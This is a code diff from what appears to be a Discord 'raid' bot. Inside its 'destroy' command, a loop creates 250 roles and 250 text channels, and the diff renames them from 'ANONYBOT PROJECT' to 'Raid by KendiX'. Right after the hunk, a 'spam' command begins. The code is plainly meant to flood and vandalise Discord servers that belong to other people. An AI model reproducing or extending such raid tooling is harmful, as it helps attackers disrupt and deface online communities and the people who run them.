@@ -106,8 +106,8 @@ async def destroy(self, ctx):
             except:
                 pass
         for _i in range(250):
-            await ctx.guild.create_role(name=f"ANONYBOT PROJECT")
-            await ctx.guild.create_text_channel(name="ANONYBOT REVIENS! (Avec KendiX)")
+            await ctx.guild.create_role(name=f"Raid by KendiX")
+            await ctx.guild.create_text_channel(name="Raid By KendiX")
 		
 @bot.command()
 async def spam(ctx, amount:int=None, *, message: str=None):
